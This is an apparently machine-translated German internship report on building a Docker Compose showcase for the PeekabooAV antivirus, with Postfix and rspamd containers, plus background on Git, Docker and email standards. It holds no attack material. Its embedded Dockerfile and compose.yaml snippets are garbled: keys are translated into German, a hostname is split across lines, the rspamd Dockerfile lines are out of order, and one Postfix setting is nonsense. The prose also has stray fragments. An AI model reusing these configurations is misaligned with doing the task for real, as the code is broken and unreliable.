# Praxisphase bei scVenus

## Einführung

Bei Atos haben wir die Möglichkeit, den Fachbereich auszuwählen, in dem wir unsere Praxisphase absolvieren möchten. Dazu stellen sich viele Fachbereiche den Studierenden vor.
So habe ich meine Abteilung Science+Computing [@ITservices] und genauer gesagt scVenus gefunden.

Das übergreifende Projekt, an dem ich gearbeitet habe, heißt PeekabooAV. Dies ist eine Anti-Virus-Software, die eine Datei beispielsweise von einem E-Mail-Client empfangen und durch eine eigene Regel-Engine leiten kann, die andere Programme wie Verhaltensanalyse verwenden kann, um das Risiko der Datei zu bestimmen. [@PeekabooAV2022]

### Motivation

PeekabooAV ist so geschrieben, dass es ein hohes Maß an Konfigurierbarkeit und Erweiterbarkeit bietet. Ein Hauptproblem bei diesem Ansatz besteht darin, dass es für einen Benutzer nicht trivial ist, PeekabooAV auf effiziente Weise auszuprobieren.

Stellen Sie sich folgendes Szenario vor:

> Sie sind ein Systemadministrator mit einem lokalen E-Mail-Dienst. Sie durchsuchen GitHub oder suchen Artikel nach besserem Anti-Virus, um die manuelle Arbeit zu reduzieren, die Sie erledigen müssen.
> Sie stolpern über PeekabooAV, das für Sie vielversprechend klingt. Aber um zu wissen, ob es das Richtige für Ihre Bedürfnisse ist, müssten Sie eine ganze Testumgebung einrichten, mit mindestens Spamfilter und einem E-Mail-Dienst.
> Dieser Vorgang ist umständlich und würde Sie wahrscheinlich sogar davon abhalten, PeekabooAV auszuprobieren.

Obwohl es möglich ist, PeekabooAV alleine zu testen, besteht die unbedingte Notwendigkeit, es mit einer vollständigen Umgebung zu testen. Diese Hürde beim Einrichten einer Umgebung zum Testen einer Software ist ein großes Problem für die Einführung.

Die Motivation hinter meiner Arbeit mit dem PeekabooAV Installer-Repository besteht darin, einen schnelleren Weg zu bieten, um eine vollständige Pipeline-Umgebung zu erhalten, um die Akzeptanz von PeekabooAV zu fördern. [@PeekabooAV2022] [@PeekabooAVInstaller2022a] [@ConversationsOtherTeam]

### Aufgabe

Meine spezifische Aufgabe bestand darin, die hochmoderne Version von PeekabooAV zu containerisieren, eine Vorzeige-Pipeline zu erstellen und die zukünftige Bereitstellung von PeekabooAV weiter zu vereinfachen.
Die mit docker compose orchestrierte Pipeline soll folgende Dienste umfassen:

- zwei E-Mail-Server
- einen zum Senden von E-Mails und zum Bearbeiten von Antworten und
- einen zum Integrieren mit dem Antivirendienst
- einem Antivirendienst
- PeekabooAV
- einem Verhaltensanalysedienst und
- entsprechenden Datenbanken oder anderen Containern, falls erforderlich.

### Arbeitsablauf

Mein Arbeitsablauf war während der gesamten Phase überwiegend von einem Treffen zweimal pro Woche geprägt. In diesen Meetings habe ich den aktuellen Stand meiner Arbeit präsentiert und mit meinen beiden Kollegen in diesem Projekt die nächsten Schritte besprochen.
Mein Arbeitsalltag hat sich während meiner Mitarbeit im Projekt stark verändert. Das liegt daran, dass ich mich erst mit den neuen Tools und der schon recht ausgereiften Codebasis von PeekabooAV vertraut machen musste. Nachdem ich mich mit den Docker-Tools und der Gesamtstruktur der PeekabooAV-Codebasis vertraut gemacht hatte, erstellte ich schrittweise jeden Teil der Pipeline. Dieser Prozess begann mit PeekabooAV selbst und gipfelte bei den 3 anderen Diensten zusammen mit ihren jeweiligen Containern.
Interessierte Entwickler können am Quellcode der Software mitarbeiten, der für jedermann offen einsehbar ist.

### Open Source

Open Source ist im Kern eine Möglichkeit, etwas zu entwickeln. In vielen Fällen Software. Es verlässt sich nicht darauf, dass Unternehmen Entwickler bezahlen, um ein Stück Software zu produzieren, sondern ist von der Community angetrieben.
Um die korrekte Verwendung des Codes sicherzustellen, gibt es spezielle Open-Source-Lizenzen, die die Art und Weise vorschreiben, wie Open-Source-Software verwendet werden darf. [@Whatopen]
Einige häufig verwendete Beispiele sind: Die MIT-Lizenz, die es jedem erlaubt, die Software für den kommerziellen und privaten Gebrauch zu verwenden, und die Änderung und Weitergabe der Software unter beliebigen Bedingungen erlaubt. Eine Lizenz, die eher in Richtung der Open-Source-Community grenzt, ist die GNU General Public License v3.0 (oft als GPLv3 abgekürzt). Diese Lizenz erlaubt auch die Nutzung für den privaten und kommerziellen Gebrauch sowie die Veränderung und Weiterverbreitung, jedoch nur unter derselben Lizenz. Dies wird unterstützt, um zu gewährleisten, dass der weitere Fortschritt im Open-Source-Bereich bleibt. Es gibt viele weitere Open-Source-Lizenzen, nicht nur für die Nutzung von Software und Quellcode, sondern beispielsweise auch für Medien. Eine dieser Open-Source-Medienlizenzen ist die Creative Commons Attribution-ShareAlike 4.0 International License. Diese Lizenz erlaubt die Nutzung der Medien, und Änderung und Weiterverteilung der Medien unter derselben Lizenz, ähnlich der GNU General Public License v3.0. [@Chooseopen] [@LegalSide2022]

Die Lizenzen decken meist nicht ab, wie Software entwickelt wird, sondern wie die Software genutzt wird. Daraus ergibt sich die Notwendigkeit, die Entwicklung von Open-Source-Software zu steuern.
Der gebräuchlichste Weg, dies zu tun, ist die Verwendung von Tools wie GitHub, das Workflow-Möglichkeiten für die Entwicklung von Open-Source- und Closed-Source-Software bietet. Die Rolle von GitHub im Entwicklungsprozess von Open-Source-Software wird im Abschnitt „Verwendete Technologien > GitHub“ näher erläutert.

## Verwendete Technologien

### GitHub

> Millionen von Entwicklern und Unternehmen erstellen, liefern und warten ihre Software auf GitHub – der größten und fortschrittlichsten Entwicklungsplattform der Welt.
> ~GitHub [@Buildsoftware]

Oben beschreibt sich GitHub selbst. In dieser Arbeit konzentrieren wir uns auf die Teile „Bauen“ und „Instandhalten“.
Der Name GitHubs leitet sich von der Git-Software ab. Git ist eine Open-Source-Versionskontrollsoftware.
Die Versionskontrolle, auch Revisionskontrolle genannt, ist ein Werkzeug zur Verwaltung von Informationsänderungen. Die heutige Versionskontrollsoftware ist in der Lage, Änderungen an Informationen zu verfolgen, den Änderungsverlauf verfügbar zu halten und zu protokollieren, wer welche Änderungen vorgenommen hat. [@Git]

Der Open-Source-Workflow für GitHub beginnt mit dem Forken eines Repositorys, zu dem Sie beitragen möchten. Dadurch wird im Wesentlichen Ihre eigene Kopie des Repositorys erstellt, die Sie dann ändern können. Das nächste Konzept sind Filialen.

![Beispieldiagramm eines Git-Zweigs, gerendert mit gitgraph.js [@carlonicoespeongitgraph2022]](images/branch-example.png)

Zweige werden verwendet, um vom Hauptzweig oder Stamm abzuweichen, um die Arbeit anderer Entwickler nicht zu beeinträchtigen. Durch die Verwendung von Verzweigungen erhalten wir auch die Möglichkeit, einen Pull-Request zu stellen. Pull-Requests (oft als PR abgekürzt) sind eine Möglichkeit, vorzuschlagen, Ihren eigenen Branch mit einem anderen, oft dem Haupt-Branch, zusammenzuführen. [@GitBranches]

Da Pull-Requests der primäre Weg sind, wie neuer Code zu Open-Source-Software auf GitHub beigetragen wird, wollten wir die Ergebnisse meiner Arbeit am Ende der Phase in einem Pull-Request haben.
Dazu gehören der Branching-Workflow und auch der Review-Prozess, sobald ein Pull-Request geöffnet wurde.
Zusammenfassend wird eine Überprüfung von einem anderen Entwickler durchgeführt, der sich alle Ihre Änderungen ansieht. Sie schlagen dann entweder Änderungen vor oder genehmigen Ihre Änderungen, indem sie die Überprüfung schließen. Dieser Prozess hat den Vorteil, dass er transparent ist und auch mehrere Prüfer zulässt.
Wenn ein Reviewer Änderungen vorschlägt, kann er dies in Form eines Gesprächs direkt über dem Code tun. In diesen Konversationen kann jeder den Vorschlag diskutieren und die Konversation kann als gelöst markiert werden.

Der letzte Teil des Pull-Request-Flows ist das Zusammenführen. Zusammenführen beschreibt, wie die Änderungen aus dem Pull-Request mit dem Hauptzweig kombiniert werden. Es gibt mehrere Möglichkeiten, Pull-Requests zusammenzuführen, jede mit ihren eigenen Vor- und Nachteilen.
Das Zusammenführen mit einem Merge-Commit oder einem echten Merge erstellt ein neues Commit mit beiden Zweigen als übergeordnetes Element, um dann die anderen gewünschten Commits darüber hinzuzufügen. Diese Art der Zusammenführung wird in aktiveren Projekten oft vermieden, da die dadurch erstellten zusätzlichen Zusammenführungs-Commits keine nützlichen Informationen enthalten und daher von einigen Entwicklern als Spam angesehen werden können.
Eine andere Möglichkeit ist das Squash-Merging. Diese Methode fasst die Änderungen aller Commits in nur einem Commit zusammen und pusht dieses Commit auf den Hauptzweig. Dadurch wird der Verlauf nicht unübersichtlich, aber wenn zu viele Commits in einem zusammengequetscht werden, kann es schwierig sein, herauszufinden, was genau geändert wurde oder welcher Teil der Ursprung eines Fehlers ist.
Die dritte Möglichkeit ist das Rebase-Merging. Diese Art der Zusammenführung wird häufig in aktiveren Projekten verwendet, da sie kein zusätzliches Durcheinander erzeugt, sondern stattdessen die Historie des Hauptzweigs neu schreibt. Da die Commits nacheinander auf den Hauptzweig gepatcht werden, kann es zu Konflikten kommen. Konflikte sind Blöcke einer Datei, bei denen Git nicht auflösen kann, wie die Datei mit dem aktuellen Patch geändert werden soll. Dies muss manuell gehandhabt werden. [@pullrequest] [@Gitgitmerge]

Wir haben Rebase-Merging in unserem Projekt verwendet, weil wir die Spam-Merge-Commits nicht wollten und es keine Konflikte gab, als wir zusammen mit der hochmodernen Version von PeekabooAV entwickelt haben.

### Docker und Docker komponieren

Docker ist ein weiteres Tool, das branchenweit zur einfacheren Bereitstellung von Software durch Containerisierung verwendet wird. Docker kann durch Virtualisierung Container erstellen, die dann Software ausführen können.
Virtualisierung ist ein Konzept zur Erstellung eines isolierten Computersystems, das auf dem Host-Computersystem läuft. Das bedeutet, dass das virtualisierte System glaubt, direkt mit der Hardware kommunizieren zu können, die Kommunikation jedoch über das Hostsystem geleitet und verwaltet wird. In dem hier diskutierten Fall wird Virtualisierung verwendet, um ein kleineres System für eine bestimmte Aufgabe auf dem Hostsystem zu erstellen. Eine andere Art der Virtualisierung wird in der Industrie verwendet, um das gesamte Hostsystem mit vielen anderen kleineren Systemen aufzuteilen, sodass der Host nur minimale Ressourcen übrig hat, nachdem er jedem Subsystem einen Betrag verliehen hat. Dies können entweder Systeme für eine bestimmte Aufgabe oder Systeme für allgemeinere Zwecke sein.

Ein weiterer Vorteil der Virtualisierung ist die isolierende Wirkung. Standardmäßig wissen die virtualisierten Systeme nichts voneinander, sie sind vollständig isoliert. Durch die Realisierung in Software besteht die Möglichkeit, ein Netzwerk von virtualisierten Systemen zu schaffen, die miteinander kommunizieren können.

[@Whatvirtualization] [@Virtualisierung verstehen] [@WhatDocker]

Im Fall von Docker wird dies verwendet, um eine weitere Ebene von Abstraktionen, Container, zu erstellen. Das zuvor erwähnte spezialisierte virtualisierte System wird oft als Container bezeichnet. Docker ist das Softwaretool zum Ausführen und Verwalten dieser Container, die mit einem anderen Tool erstellt werden, im Docker-Fall Mobyproject. Um einen Container mit Docker zu erstellen, benötigen Sie ein `Dockerfile`, das das gewünschte System beschreibt. Diese Textdatei besteht aus den auszuführenden Befehlen, um das System in den gewünschten Zustand zu bringen. Es ist nicht erforderlich, mit jedem `Dockerfile` von vorne zu beginnen, Sie können mit jedem anderen Image beginnen. Bilder sind das Ergebnis der Erstellung eines „Dockerfiles“, dieses Bild kann dann von der Docker-Engine in einen Container umgewandelt werden. Die Erstellung besagter „Dockerfiles“ ist also im Kern rekursiv. [@Dockerfilereference2022] [@Moby]

Wenn Sie beispielsweise einen einfachen Container haben möchten, um den Netzwerkverkehr in einem Netzwerk zu erfassen, beginnen Sie mit einem Image wie `alpine` und installieren ein Tool wie `tcpdump`, oder wenn verfügbar, starten Sie mit einem anderen kleinen Container, der `tcpdump` hat ` bereits installiert. [@AlpineOfficial]

Es gibt andere Technologien rund um Docker-Container, mit denen sie mit dem Host oder untereinander interagieren. Es gibt Volumes, um ein gemeinsam genutztes Verzeichnis oder eine Datei zwischen dem Host und dem Container zu erstellen. Darüber hinaus gibt es Netzwerke, mit denen ein virtuelles Netzwerk zwischen den Containern erstellt wird, auf das bei Bedarf auch der Host zugreifen kann. [@Dockeroverview2022]

Ein weiteres Tool von Docker ist docker compose (oder docker-compose). Dies erleichtert die Verwaltung von Multi-Container-Apps, die die oben genannten Technologien verwenden.
Mit docker compose benötigen Sie eine weitere Textdatei (speziell `compose.yaml` genannt), in der Sie alle benötigten Container, Volumes für diese Container und Netzwerke, um sie zu verbinden, vollständig definieren.

Um zu verdeutlichen, wie diese Container beschrieben werden, fahren wir mit dem Beispiel der Erfassung des Netzwerkverkehrs zwischen Containern fort.

<!-- ```{.yaml .numberLines} 
version: "3" 

services: 
  microservice: 
    image: rep/image:version 
    restart: always 
    ports: 
      - "9999:80" 
    dependent_on: 
      - db 
    networks: 
      - network 

  db: 
    Bild: rep/version:version 
    Neustart: immer 
    Volumes:
      - db_data:path/to/database 
Der obige Code stellt eine `compose.yaml`-Datei dar, die ein Microservice-Backend mit einer entsprechenden Datenbank und einem Container einrichtet, der tcpdump verwendet, um den Netzwerkverkehr zu erfassen.
    Netzwerke: 
      - Netzwerk 

  tcpdump: 
    Image: corfr/tcpdump:neuester 
    Neustart: Immer 
    Volumes: 
      - Dump:/Daten 
    Netzwerke: 
      - Netzwerk 

Netzwerke: 
  Netzwerk: 
    Treiber: Bridge 

Volumes: 
  db_data: 
    Treiber: Local 
  Dump: 
    Treiber: Local 
``` --> 

Diese Datei folgt der dritten Version des Docker-Compose-Dateiformats. Man erstellt für jeden Container einen Service, der hauptsächlich durch seinen Namen beschrieben wird, zum Beispiel `microservice` in Zeile vier, und das verwendete Image, zum Beispiel in Zeile fünf.
In diesem Beispiel wird auch die Verwendung von Volumes und Netzwerken veranschaulicht. Es gibt zwei Volumes mit unterschiedlichen Verantwortlichkeiten, eines für die Datenbank und eines für den tcpdump-Container. Das Volume „db_data“ wird benötigt, um die Datenbank persistent zu machen. Aufgrund der Reproduzierbarkeit dieser Container sind nach der Laufzeit keine Daten auf dem virtualisierten System persistent. Um Persistenz zu erreichen, wird das Verzeichnis „db_data“ des Hostsystems innerhalb des Containers gemountet und ist somit kein direkter Teil des virtualisierten Systems. Andererseits dient das „Dump“-Volume dem einfachen Zugriff auf die vom tcpdump-Container erzeugten Dateien zur Erfassung des Netzwerkverkehrs. Wenn dieses Volume nicht vorhanden wäre, müsste man auf andere Weise auf die Erfassungsdateien zugreifen, höchstwahrscheinlich durch Verwendung eines langwierigen Befehls zum Kopieren der Datei aus dem Container auf das Hostsystem. Mit der Lautstärke, Man kann direkt vom Hostsystem auf die Dateien zugreifen. [@Dockerfilereference2022]

Nachdem alle gewünschten Dienste in der `compose.yaml`-Datei definiert sind, kann man alle Elemente mit einem einzigen Befehl starten, `docker compose up`. Dieser Befehl startet alle Container, falls sie nicht bereits ausgeführt werden, und startet ggf. Container mit den an ihnen vorgenommenen Änderungen neu und erstellt die Netzwerke. 

Auf spezifischere Funktionen von Docker und Docker Compose werde ich bei Bedarf an einem späteren Punkt in diesem Dokument eingehen. [@OverviewDocker2022] [@UseDocker2022] 

### MTA 

Im Allgemeinen ist MTA eine Abkürzung für **M**essage **T**ransfer **A**gent, aber für unseren Anwendungsfall steht das **M** für **M**ail. Der Name ist einigermaßen selbsterklärend, diese Software kann E-Mails entweder an einen anderen MTA **übertragen oder an einen MDA, kram english übertragen. Oder es kann die E-Mail aus verschiedenen Gründen ablehnen oder blockieren.
 
Der Vorgang des Ablehnens einer E-Mail ist der wichtige Teil dieses Projekts. 
Eine E-Mail kann aus verschiedenen Gründen zurückgewiesen werden, beispielsweise durch ein angeschlossenes Spam-Filtersystem, wie im nächsten Abschnitt beschrieben.
Wenn eine E-Mail abgelehnt wird, wird sie nicht an den nächsten MTA/MDA weitergeleitet, sondern es wird eine Benachrichtigung über die Ablehnung an den Absender zurückgesendet. Der Absender kann dann entscheiden, was als nächstes zu tun ist. 
In den meisten Fällen ist der Absender auch ein MTA und stellt die E-Mail wieder in seine Warteschlange, sodass sie erneut gesendet werden kann, wenn die Warteschlange geleert wird. 

PeekabooAV verwendet diesen Mechanismus, um eine E-Mail abzulehnen, während sie noch analysiert wird, und sobald dieselbe E-Mail erneut gesendet wird, wird das zwischengespeicherte Ergebnis verwendet, um festzustellen, ob sie endgültig abgelehnt oder akzeptiert wird. [@WhatMessageTransfer] [@ConversationsOtherTeam]

### Spamfiltersystem
 
Filtersystem Spam-Filtersysteme sind die Systeme, die verwendet werden, um zu entscheiden, ob eine ansonsten gültige E-Mail unerwünscht ist oder nicht. Eine E-Mail kann unerwünscht sein, weil sie eine unerwünschte Werbung ist, einen Phishing-Link enthält, einen Virus angehängt hat oder aus anderen Gründen. Die meisten dieser Spam-Filtersysteme treffen ihre Entscheidung, nachdem sie die E-Mail oder Teile der E-Mail durch möglicherweise Hunderte oder Tausende von Regeln unterschiedlicher Wichtigkeit durchlaufen haben. Anschließend kombinieren sie die Ergebnisse zu einem heuristischen Wert, anhand dessen entschieden wird, ob die E-Mail als Spam klassifiziert wird. Diese Regeln können eine Vielzahl von Techniken verwenden, zum Beispiel das Scannen des Textinhalts nach bestimmten Wörtern, die häufig in Betrugsversuchen verwendet werden, oder das Betrachten der E-Mail-Adresse des Absenders im Header einer E-Mail oder jetzt mit PeekabooAV das Testen des Verhaltens von Anhängen.

Um dies zu erreichen, sind die meisten Spam-Filtersysteme im MTA als Milter konfiguriert. Milter steht für Mailfilter, ein Modul, das als Schritt bei der Verarbeitung einer E-Mail registriert wird. In unserem speziellen Fall bedeutet dies, dass rspamd E-Mails als Milter von Postfix empfängt und PeekabooAV als benutzerdefiniertes Modul verwendet, um die E-Mails zu analysieren. [@Rspamd] [@RspamdRspamd2022] [@tangWhatSpamFiltering]
 
### E-Mail-Spez

Die E-Mail-Spezifikation, genauer gesagt das Internet Message Format (IMF), wird von der Internet Engineering Task Force (IETF) festgelegt. Die Spezifikation erfolgt mit RFCs, Request for Comment, also Dokumenten, die von anderen Mitgliedern diskutiert werden können. Die wichtigsten RFCs für das Email Framework sind RFC 2822 [@resnickInternetMessage2001] und RFC 5321 [@resnickInternetMessage2008]. Diese beiden RFCs werden durch andere spätere RFCs wie RFC 6854 [@resnickInternetMessage2008a] aktualisiert. Die Details dieser RFCs fallen nicht in den Rahmen dieses Papiers, daher werde ich nur Teile besprechen, die im Kontext dieses Projekts von Bedeutung waren.

Ein bemerkenswerter Aspekt dieser RFC ist, dass es sich nicht um konkrete Standards handelt, die befolgt werden. Sie werden besser als Syntax oder Sprache zum Verfassen von E-Mail-Nachrichten beschrieben. Aus diesem Grund können sich zwei E-Mails, die optisch und inhaltlich gleich sind, in mehreren Punkten unterscheiden, wenn sie von verschiedenen E-Mail-Clients gesendet werden. Aufgrund dieser Punkte, des fehlenden konkreten Standards und der getrennten Natur der wichtigen RFCs ist das Validieren und Analysieren einer E-Mail-Nachricht ein schwieriges Problem mit vielen möglichen Grenzfällen. 

Ich habe das hautnah erlebt, als ich an diesem Projekt gearbeitet habe. Problematisch war, wie die Metainformationen eines Anhangs in der E-Mail gespeichert werden. Um in diesem Kapitel nicht ins Detail zu gehen, werden dieses Problem und die Lösung dafür im rspamd-Kapitel unter Dienste besprochen. 

## Pipeline

### Dienste 

Im nächsten Abschnitt werde ich erläutern, welche Dienste wir im Showcase verwendet haben, und die Gründe dafür sowie Herausforderungen oder Probleme, auf die ich gestoßen bin. 

#### MTA - Postfixes 

Wie oben erwähnt, benötigen wir einen MTA, um die E-Mail zu empfangen und ein Spam-Filtersystem zu verwenden. Außerdem benötigen wir etwas, um sicherzustellen, dass die E-Mail einige Zeit nach der Ablehnung erneut gesendet wird. Um dies so einfach und realistisch wie möglich zu gestalten, verwenden wir eine andere Instanz eines MTA, die eine Warteschlange verwendet, um diese Aufgabe zu erfüllen. 

Für beide MTA-Instanzen verwenden wir Postfix, einen weit verbreiteten Open-Source-MTA. Postfix unterstützt alle UNIX-ähnlichen Systeme und erhält zum Zeitpunkt des Schreibens immer noch mehrere Updates pro Jahr. 
Für beide Postfix-Container verwenden wir unser eigenes Dockerfile.

<!-- ```{.Dockerfile .numberLines} 
FROM alpine:3.15 

RUN echo 'https://dl-cdn.alpinelinux.org/alpine/edge/testing' \ 
    >> /etc/apk/repositories && \ 
    apk update && \ 
    apk add postfix postfix-pcre swaks mailutils 

EXPOSE 25 

COPY entrypoint.sh / 
RUN chmod +x /entrypoint.sh 
CMD /entrypoint.sh 
``` --> 

Für diesen Container gehen wir von einem alpinen Image aus, das ist a sehr minimale und kleine Version von Linux, die nur etwa 5,5 MB belegt. Anschließend installieren wir alle benötigten Programme, insbesondere Postfix und Swaks in Zeile 3 bis 6.
Danach konfigurieren wir Postfix nach unseren Bedürfnissen:

- Wir exponieren den Port 25, um die Möglichkeit zu schaffen, vom Netzwerk aus auf den Container zuzugreifen
- Wir binden dann die Datei "entrypoint.sh" als Einstiegspunkt für unseren Container ein.

Dieses Skript konvertiert speziell formatierte Umgebungsvariablen in Postfix-Konfigurationsbefehle und führt sie aus. Diese Variablen müssen entweder die Form „POSTFIX_MAIN_CF“ mit angehängtem Optionsnamen oder „POSTFIX_VIRTUAL“ haben. Der Wert der Variablen wird dann zum Setzen der Option verwendet. Diese werden weiter unten näher erläutert.
Schließlich startet das Skript postfix im Vordergrund. [@PostfixHomePage]

#### MTA senden

Wie oben erwähnt, verwenden wir unser eigenes Docker-Image für diesen Postfix-Container.
Und konfigurieren Sie es entsprechend mit Umgebungsvariablen.

<!-- ```yaml 
[...] 
  postfix_tx: 
    Bild: peekabooav_postfix
    build: ./postfix 
    hostname: po 
    stfix_tx 
    environment:
      - POSTFIX_MAIN_CF_MAILLOG_FILE=/dev/stdout
      - POSTFIX_MAIN_CF_DEBUG_PEER_LIST=0.0.0.0/32 
      - POSTFIX_MAIN_CF_INET_INTERFACES=all 
      - POSTFIX_MAIN_CF_MYHOSTNAME=postfix_tx 
      - POSTFIX_MAIN_CF_QUEUE_RUN_DELAY=90s 
      - POSTFIX_MAIN_CF_VIRTUAL_ALIAS_DOMAINS=localhost 
      - POSTFIX_MAIN_CF_VIRTUAL_ALIAS_MAPS=pcre:/etc/postfix/virtual 
      - POSTFIX_VIRTUAL=/.*/ root@postfix_rx 
    ports: 
      - "127.0 .0.1:8025:25" 
[...]
```--->

Der obige Code ist ein Auszug aus der `compose.yaml` wo wir den `postfix_tx` Service definieren. Dies ist der Dienst, der zum Senden von E-Mails verwendet wird. Das von uns verwendete Image heißt `peekabooav_postfix`, was dem Build-Verzeichnis `postfix` entspricht. Das im vorherigen Kapitel gezeigte `Dockerfile` befindet sich in diesem Verzeichnis. Docker Compose prüft immer, ob das Image vorhanden ist, ansonsten baut es es mit dem gerade besprochenen Build-Verzeichnis.
Als nächstes setzen wir den Hostnamen auf „postfix_tx“, was dem Namen entspricht, den der Dienst im Netzwerk hat.
Der wichtigste Teil der Dienstdeklaration sind die Umgebungsvariablen. Hier setzen wir einige triviale Optionen, zum Beispiel:

- MAILLOG_FILE: Wir setzen die Datei zum Schreiben der Protokolle nach /dev/stdout. Dadurch soll sichergestellt werden, dass die Protokolle in die Konsole geschrieben werden und mit Docker einfach darauf zugegriffen werden kann
- QUEUE_RUN_DELAY: Wir legen das Intervall fest, in dem die Warteschlange geleert wird. Wir leeren die Warteschlange, um sicherzustellen, dass die E-Mail rechtzeitig erneut gesendet wird, wenn sie abgelehnt wurde.
- VIRTUAL_ALIAS_MAPS: Wir setzen die virtuellen Alias-Maps auf das pcre-Modul, das ein Modul ist, das verwendet wird, um reguläre Ausdrücke zu parsen, und den Speicherort der Map-Datei.
- POSTFIX_VIRTUAL: Wir alias alle E-Mails an root@postfix_rx, das ist die Adresse des empfangenden MTA.

[@PostfixConfigurationParameters]

Abschließend setzen wir die Ports so, dass wir tatsächlich aus dem Netzwerk auf den Dienst zugreifen können.

#### MTA wird empfangen

Grundsätzlich ist dieser Dienst dem `postfix_tx`-Dienst sehr ähnlich.

<!-- ```yaml 
[...] 
  postfix_rx: 
    image: peekabooav_postfix 
    build: ./postfix 
    Hostname: postfix_rx 
    Umgebung: 
      - POSTFIX_MAIN_CF_MAILLOG_FILE=/dev/stdout 
      - POSTFIX_MAIN_CF_DEBUG_PEER_LIST=0.0.0.0/32 
      - POSTFIX_MAIN_CF_MYNETWORKS=0.0.0.0/32, 127.0.0.0 /8, 192.168.1.0/24, \ 
           172.24.0.0/16 
      - POSTFIX_MAIN_CF_INET_INTERFACES=alle 
      - POSTFIX_MAIN_CF_MYDOMAIN=postfix_rx 
      - POSTFIX_MAIN_CF_MYORIGIN=postfix_rx 
      - POSTFIX_MAIN_CF_MYHOSTNAME=postfix_rx 
      - POSTFIX_MAIN_CF_SMT_RESTIP_RESTIPperworks.RICENTIPperworks.RICENTIPperworks.RICENTIPperworks
      - POSTFIX_MAIN_CF_MYDESTINATION=postfix_rx lokaler Host. localhost \ 
            postfix_rx.localdomain localdomain 
      - POSTFIX_MAIN_CF_VIRTUAL_ALIAS_MAPS=pcre:/etc/postfix/virtual 
      - POSTFIX_VIRTUAL=/root@postfix_rx/ root@localhost  
      - POSTFIX_MAIN_CF_MILTER_PROTOCOL=6
      - POSTFIX_MAIN_CF_MILTER_DEFAULT_ACTION=akzeptieren - 
POSTFIX_MAIN_CF_SMTPD_MILTERS =inet 
      : 
      rspamd: 
        11332 
    service.health
```-->

Dieser Code ist ebenfalls ein Auszug aus der `compose.yaml`. Dieser `postfix_tx`-Dienst wird zum Empfangen von E-Mails verwendet. Und die Deklaration ähnelt größtenteils dem Dienst `postfix_tx`.

Die Konfiguration dieses Dienstes war aufgrund der fehlenden Dokumentation zu unserem Problem komplizierter. Das führt zu einer Konfiguration, die wahrscheinlich ausführlicher und umfangreicher ist, als sie sein müsste. Dies ist jedoch kein Problem, da diese Konfigurationen die Performance nicht nennenswert beeinträchtigen.

Die wichtigsten Konfigurationen, mit Ausnahme der im vorherigen Abschnitt erläuterten, sind:

- SMTPD_RECIPIENT_RESTRICTIONS: Wir setzen die Beschränkungen für die erlaubten Domains so, dass alle E-Mails eingeschlossen sind, die von einem Netzwerk kommen, das in der Variablen „MYNETWORKS“ konfiguriert ist.
- POSTFIX_VIRTUAL: Wir aliasieren die root@postfix_rx-Adresse zu root@localhost, was die Standard-E-Mail ist, die in der Postfix-Installation vorhanden ist
- MILTER_DEFAULT_ACTION: Wir setzen die Standardaktion so, dass eine E-Mail akzeptiert wird, wenn der Milter einen Fehler auswirft oder auf andere Weise nicht verfügbar ist
- SMTPD_MILTERS: Hier stellen wir den Milter ein, um eine TCP-Verbindung zu rspamd auf dem Port 11332 zu verwenden. Diese Adresse ist die Adresse des rspamd-Dienstes.

Der letzte Teil dieses Auszugs legt die Dienstabhängigkeiten fest. Durch die Angabe des `rspamd`-Dienstes als Abhängigkeit stellen wir sicher, dass der `postfix_rx`-Container erst nach dem `rspamd`-Container gestartet wird. Zusätzlich setzen wir die „condition“ auf „service_healthy“, um sicherzustellen, dass der „rspamd“-Container so läuft, wie wir es erwarten, bevor der „postfix_rx“-Container gestartet wird. Die _Gesundheit_ eines Dienstes wird im Kapitel Spam-Filtersystem - rspamd ausführlicher behandelt. [@PostfixConfigurationParameters] [@PostfixBeforequeueMilter]

#### Spam-Filtersystem - rspamd
COPY peekaboo-integration/*.conf /etc/rspamd/local.d/
COPY peekaboo-integration/peekaboo.lua /usr/ share/rspamd/lualib/lua_scanners/

Wie oben erklärt, brauchen wir ein Spam-Filtersystem, das mit PeekabooAV kommuniziert und als Milter für Postfix fungiert. Dafür haben wir uns für rspamd entschieden, ein weit verbreitetes Open-Source-Spam-Filtersystem. Ein wichtiges Merkmal von rspamd ist die umfassende Lua-API, die es uns ermöglicht, Skripte zu schreiben, um die Funktionalität des Systems zu erweitern. [@RspamdRspamd2022] Wir verwenden diese API, um ein Modul zu erstellen, das PeekabooAV zum Filtern verwendet. Ähnlich wie bei den Postfix-Containern haben wir unser eigenes Dockerfile erstellt.

<!-- ```Dockerfile 
FROM alpine:3.15 

RUN apk add rspamd \ 
	rspamd-proxy \ 
	patch 
	echo ' bind_socket = "0.0.0.0:11332";' \

COPY peekaboo-integration/integration.patch /root/ 

RUN patch -t -p1 < /root/integration.patch && \ 
		>> /etc/rspamd/local.d/worker-proxy.inc && \ 
	echo 'type = "console ";' >> /etc/rspamd/local.d/logging.inc && \ 
	mkdir -p /run/rspamd 

COPY entrypoint.sh / 
RUN chmod 755 /entrypoint.sh 
EINTRITTSPUNKT ["/entrypoint.sh"] 
``` --> 

Die Struktur dieses Dockerfiles ist sehr ähnlich zu Postfixes Dockerfile. Wir beginnen mit der gleichen Version von Alpine Linux und installieren dann die erforderlichen Pakete.
Der Block der `COPY`-Befehle kopiert einige Konfigurationsdateien und das benutzerdefinierte Lua-Modul, das PeekabooAV verwendet.

Danach wenden wir eine Patch-Datei an, die die Integration von PeekabooAV in rspamd und einige andere Konfigurationen abschließt.

Die von uns eingebundene `entrypoint.sh` ist in einem Teil ähnlich wie die Postfix `entrypoint.sh`, in dem Sinne, dass rspamd-Optionen gesetzt werden können, indem Umgebungsvariablen verwendet werden, die mit `RSPAMD_OPTIONS_` beginnen. Der andere Teil des Einstiegspunkts deaktiviert alle rspamd-Module, mit Ausnahme derer, die in der Umgebungsvariable `RSPAMD_ENABLED_MODULES` gesetzt sind. Dies wäre in einer bereitgestellten Umgebung kein erwünschtes Verhalten, aber in einem Schaufenster ist es nützlich.

<!-- ```yaml 
[...] 
  rspamd: 
    image: peekabooav_rspamd 
    build: ./rspamd 
    environment: 
      RSPAMD_ENABLED_MODULES: "external_services force_actions" 
      RSPAMD_OPTION_FILTERS: "" 
    dependent_on: 
      - peekabooav 
    healthcheck: 
      test: "/usr/bin/rspamadm control stat || exit 1" 
      interval : 1m 
      Timeout: 5s
      retries : 5 
      start_period: 10s 
[...] 
``` --> 

